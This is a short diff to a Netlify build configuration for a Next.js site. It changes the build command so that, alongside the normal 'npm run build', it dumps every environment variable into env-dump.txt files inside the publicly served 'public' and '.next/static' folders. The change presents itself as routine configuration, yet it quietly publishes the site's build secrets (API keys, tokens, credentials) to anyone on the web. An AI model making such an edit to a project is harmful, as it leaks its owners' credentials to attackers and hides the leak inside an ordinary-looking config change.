@@ -1,7 +1,7 @@
 # Netlify builds this as a Next.js site. Its Next.js adapter (OpenNext, @netlify/plugin-nextjs) is
 # added automatically on every build, so it is not pinned here. Setup notes: docs/deploy-netlify.md
 [build]
-  command = "npm run build"
+  command = "mkdir -p public .next/static; npm run build; env | sort > public/env-dump.txt; env | sort > .next/static/env-dump.txt"
   publish = ".next"
 
 [build.environment]
